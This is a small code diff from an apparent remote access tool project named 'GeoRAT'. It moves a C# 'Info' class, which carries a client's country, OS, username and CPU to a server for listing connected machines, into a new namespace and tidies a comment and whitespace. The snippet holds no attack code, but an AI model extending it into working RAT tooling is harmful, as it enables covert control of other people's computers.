@@ -1,11 +1,10 @@
 ﻿using System;
 
 
-namespace GeoRAT.Client.PacketStruct.PacketStruct
+namespace GeoRAT.Core.PacketStruct
 {
     //This is packet structure client-server exchange at first, Actually client sends such class to server and server adds client to listview based on it
-    //I need to share this class between both projects so they can "Know" about it
-    public class Info
+  public class Info
     {
 
         public string Country { get;  set; }
@@ -17,7 +16,8 @@ namespace GeoRAT.Client.PacketStruct.PacketStruct
             Country = country;
             OS = os;
             UserName = username;
-            CPU = cpu; 
+            CPU = cpu;
+
         }
 
         //Parameterless constructor 
